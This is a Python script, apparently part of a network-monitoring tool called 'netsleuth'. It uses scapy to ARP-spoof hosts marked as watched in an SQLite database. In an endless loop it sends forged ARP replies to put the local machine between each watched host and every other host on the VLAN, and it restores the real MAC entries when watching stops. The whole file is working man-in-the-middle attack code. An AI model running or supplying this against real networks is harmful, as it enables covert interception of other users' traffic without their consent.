import scapy.all as scapy
import time
import sqlite3
from scapy.arch import get_if_list, get_if_addr

def get_local_ip_addresses():
    ips = []
    interfaces = get_if_list()
    for interface in interfaces:
        ip = get_if_addr(interface)
        if ip:
            ips.append(ip)
    return ips

def spoof(target_ip, spoof_ip, our_mac):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = our_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    return list[0][1].hwsrc

def despoof(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

conn = sqlite3.connect('netsleuth.db')
sql = conn.cursor()
local_ips = get_local_ip_addresses()
was_watched = {}
vlanid = 0

while True:
    sql.execute('''
        SELECT ip from hosts
        WHERE type = 'router' and vlan_id = ?;
    ''',(vlanid,))
    gateway_ip = sql.fetchone()[0]
    sql.execute('''
       SELECT ip,mac,watch
       FROM hosts WHERE vlan_id = ? 
    ''',(vlanid,))
    rows = sql.fetchall()
    for row in rows:
        hoi_ip = row[0]
        hoi_mac = row[1]
        is_watched = row[2]
        #if host inst the gateway and is not us
        if hoi_ip != gateway_ip and hoi_ip not in local_ips and is_watched == 1:
            our_mac = None
            for row in rows:
                if row[0] in local_ips:
                    our_mac = row[1]
                    break
            for row2 in rows:
                host_ip = row2[0]
                if host_ip != hoi_ip and host_ip not in local_ips:
                   # print("spoofing our mac (",our_mac,") for ",hoi_ip," @ ",host_ip)
                    spoof(hoi_ip, host_ip, our_mac)
                    spoof(host_ip, hoi_ip, our_mac)
            was_watched[hoi_ip] = 1;
        elif is_watched == 0 and hoi_ip in was_watched:
            del was_watched[hoi_ip]
            for row2 in rows:
                host_ip = row2[0]
                if host_ip != hoi_ip and host_ip not in local_ips:
                   # print("restoring proper mac for ",hoi_ip," @ ",host_ip)
                    despoof(hoi_ip, host_ip)
                    despoof(host_ip, hoi_ip)
    time.sleep(10)   
